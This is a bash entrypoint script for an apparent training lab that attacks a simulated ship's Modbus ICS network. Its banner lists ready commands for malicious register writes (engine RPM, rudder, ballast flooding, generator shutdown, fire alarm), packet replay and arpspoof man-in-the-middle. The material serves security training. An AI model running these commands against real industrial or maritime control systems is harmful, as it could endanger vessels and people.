#!/usr/bin/env bash
# ============================================================
# Kali pentest container entrypoint
# Waits for field device, then prints a usage banner.
# ============================================================
set -e

FIELD_DEVICE_HOST="${FIELD_DEVICE_HOST:-172.20.0.20}"
CONTROLLER_HOST="${CONTROLLER_HOST:-172.20.0.10}"

# --------------------------------------------------------------------------
# Wait for field device port 502
# --------------------------------------------------------------------------
echo "[entrypoint] Waiting for field device at ${FIELD_DEVICE_HOST}:502..."
timeout=30
elapsed=0
while ! nc -z "${FIELD_DEVICE_HOST}" 502 2>/dev/null; do
    sleep 2
    elapsed=$((elapsed + 2))
    if [ "$elapsed" -ge "$timeout" ]; then
        echo "[entrypoint] WARNING: field device not reachable after ${timeout}s, continuing anyway"
        break
    fi
done
echo "[entrypoint] Field device reachable."

# --------------------------------------------------------------------------
# Verify Modbuster import
# --------------------------------------------------------------------------
if python3 -c "import modbuster" 2>/dev/null; then
    MODBUSTER_VER=$(python3 -c "import modbuster; print(modbuster.__version__)" 2>/dev/null || echo "unknown")
    echo "[entrypoint] Modbuster v${MODBUSTER_VER} ready."
else
    echo "[entrypoint] WARNING: modbuster import failed. Check /opt/modbuster volume mount."
fi

# --------------------------------------------------------------------------
# Detect sniff interface
# --------------------------------------------------------------------------
if ip link show eth0 > /dev/null 2>&1; then
    SNIFF_IFACE="eth0"
else
    SNIFF_IFACE=$(ip -o link show | awk -F': ' '$2 != "lo" {print $2; exit}')
fi
export SNIFF_IFACE
echo "[entrypoint] Sniff interface: ${SNIFF_IFACE}"

# --------------------------------------------------------------------------
# Disable IP forwarding — on a real attacker machine this is off by default.
# Docker forces ip_forward=1; we reset it so arpspoof alone drops intercepted
# traffic without any extra steps. Kali's own connectivity is unaffected
# (single interface — there's nothing to forward between interfaces anyway).
# --------------------------------------------------------------------------
echo 0 > /proc/sys/net/ipv4/ip_forward
echo "[entrypoint] IP forwarding disabled (ip_forward=0) — arpspoof will drop intercepted traffic automatically"

# --------------------------------------------------------------------------
# Banner
# --------------------------------------------------------------------------
cat <<BANNER

================================================================
  Modbuster ICS/SCADA Pentest Lab  |  Royal Caribbean (8 Units)
  Authorized laboratory use ONLY.
================================================================

  Network:
    Field Device  (Modbus slave):    ${FIELD_DEVICE_HOST}:502
    Controller    (Modbus master):   ${CONTROLLER_HOST}
    This box      (kali_pentest):    172.20.0.30
    Sniff iface:  ${SNIFF_IFACE}

  Units:
    1=Propulsion  2=Navigation  3=Ballast
    4=PowerMgmt   5=HVAC        6=FireSafety
    7=Fuel        8=Stabilizers

  ┌─ ANALYZE ──────────────────────────────────────────────────
  │ Live sniff (streams in real-time, Ctrl+C to stop):
  │   python3 -m modbuster analyze --live --iface ${SNIFF_IFACE}
  │
  │ Live TUI view:
  │   python3 -m modbuster analyze --live --iface ${SNIFF_IFACE} --tui
  │
  │ Capture to PCAP, then analyze offline:
  │   tcpdump -i ${SNIFF_IFACE} -w /workspace/capture.pcap tcp port 502 &
  │   # ... wait, then: kill %1
  │   python3 -m modbuster analyze --pcap /workspace/capture.pcap
  │   python3 -m modbuster analyze --pcap /workspace/capture.pcap --export /workspace/out.json

  ┌─ INJECT: READ (no --write required) ──────────────────────
  │ Unit 1 — Main Propulsion (engines, thrusters, shaft RPM):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} read-holding --unit 1 --addr 0 --count 10
  │
  │ Unit 2 — Navigation/Bridge (rudder, speed, heading, GPS):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} read-holding --unit 2 --addr 0 --count 10
  │
  │ Unit 3 — Ballast/Safety (tank levels, alarms):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} read-holding --unit 3 --addr 0 --count 10
  │
  │ Unit 4 — Power Management (generators, bus voltage, load):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} read-holding --unit 4 --addr 0 --count 10
  │
  │ Unit 5 — HVAC/Environmental (zone temps, chilled water):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} read-holding --unit 5 --addr 0 --count 10
  │
  │ Unit 6 — Fire Safety & Alarms (fire zones, CO2, smoke):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} read-holding --unit 6 --addr 0 --count 10
  │
  │ Unit 7 — Fuel Management (HFO/MGO tanks, flow, mode):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} read-holding --unit 7 --addr 0 --count 10
  │
  │ Unit 8 — Stabilizers/Motion (fins, roll, pitch, hydraulics):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} read-holding --unit 8 --addr 0 --count 10

  ┌─ INJECT: WRITE ATTACKS (requires --write) ────────────────
  │ Spike port engine RPM to 950 (unit 1, addr 0):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} --write write-register \
  │     --unit 1 --addr 0 --value 950
  │
  │ Set rudder hard to starboard +15° (unit 2, addr 0, value=195):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} --write write-register \
  │     --unit 2 --addr 0 --value 195
  │
  │ Flood fore ballast tank (unit 3, addr 0, value=950 = 95%):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} --write write-register \
  │     --unit 3 --addr 0 --value 950
  │
  │ Drop Generator 2 to zero (unit 4, addr 1, value=0):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} --write write-register \
  │     --unit 4 --addr 1 --value 0
  │
  │ Set cabin temp to 18°C (unit 5, addr 0, value=180):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} --write write-register \
  │     --unit 5 --addr 0 --value 180
  │
  │ Trigger fire zone 2 alarm (unit 6, addr 1, value=2):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} --write write-register \
  │     --unit 6 --addr 1 --value 2
  │
  │ Switch fuel mode to MGO (unit 7, addr 8, value=1):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} --write write-register \
  │     --unit 7 --addr 8 --value 1
  │
  │ Retract port stabilizer fin (unit 8, addr 2, value=0):
  │   python3 -m modbuster inject --protocol modbus \
  │     --target ${FIELD_DEVICE_HOST} --write write-register \
  │     --unit 8 --addr 2 --value 0

  ┌─ REPLAY ──────────────────────────────────────────────────
  │ Replay first packet from capture:
  │   python3 -m modbuster replay \
  │     --pcap /workspace/capture.pcap \
  │     --target ${FIELD_DEVICE_HOST} --index 0
  │
  │ Replay a specific write command (requires --write):
  │   python3 -m modbuster replay \
  │     --pcap /workspace/capture.pcap \
  │     --target ${FIELD_DEVICE_HOST} --index 5 --write
  │
  │ Replay multiple packets (first 10):
  │   python3 -m modbuster replay \
  │     --pcap /workspace/capture.pcap \
  │     --target ${FIELD_DEVICE_HOST} --count 10

  ┌─ WEB DASHBOARDS (open in host browser) ──────────────────
  │ Controller panel (master):   http://localhost:8080
  │ Field device 1 (Units 1-4):  http://localhost:8082
  │ Field device 2 (Units 5-8):  http://localhost:8083

  ┌─ NETWORK ATTACKS ─────────────────────────────────────────
  │ Use the Modbuster GUI (Attack tab → ARP SPOOF) for one-click attacks.
  │ Start ARP Spoof poisons the controller; Stop restores ARP immediately.
  │
  │ Manual equivalent (if needed):
  │   arpspoof -i ${SNIFF_IFACE} -t 172.20.0.10 172.20.0.20   # FD1
  │   arpspoof -i ${SNIFF_IFACE} -t 172.20.0.10 172.20.0.21   # FD2
  │   (Ctrl+C to stop — controller ARP refreshes within ~30s)
  │
  │ Verify (controller's Modbus traffic arriving at Kali):
  │   tcpdump -i ${SNIFF_IFACE} -n 'tcp port 502'

================================================================

BANNER

# Drop to bash (or run any command passed to docker exec)
if [ "$#" -gt 0 ]; then
    exec "$@"
else
    exec /bin/bash
fi
